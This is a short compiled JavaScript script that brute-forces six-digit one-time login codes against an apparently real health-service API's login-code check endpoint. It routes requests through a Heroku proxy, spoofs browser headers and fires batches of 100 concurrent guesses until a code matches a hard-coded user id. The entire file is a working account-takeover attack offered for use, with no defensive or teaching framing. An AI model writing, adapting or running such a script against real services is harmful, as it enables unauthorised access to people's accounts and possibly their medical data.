"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
const axios = require('axios');
function sendRequest(code) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = `{\n  "id": "fe06993f-081e-48ec-8591-5a73b00d61a4",\n  "code": ${code}`;
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://secure-ridge-22999-537c838d4a8a.herokuapp.com/https://www.api.renewrx.health/api/users/checkLoginCode',
            headers: {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8,he;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://ff-debug-service-frontend-pro-ygxkweukma-uc.a.run.app',
                'Referer': 'https://ff-debug-service-frontend-pro-ygxkweukma-uc.a.run.app/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            },
            data: data
        };
        try {
            const response = yield axios.request(config);
            console.log(response.data);
            if (response.data && response.data.id === 'fe06993f-081e-48ec-8591-5a73b00d61a4' && response.data.code === code) {
                console.log(`Correct OTP code is: ${code}`);
                process.exit(0); // Exit the process
            }
        }
        catch (err) {
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 872600; i < 999999; i += 100) {
            const p = [];
            for (let j = 0; j < 100; j++) {
                console.log(i + j);
                p.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(p); // here we are waiting for the above 100 request promise to get fulfilled
        }
    });
}
main();
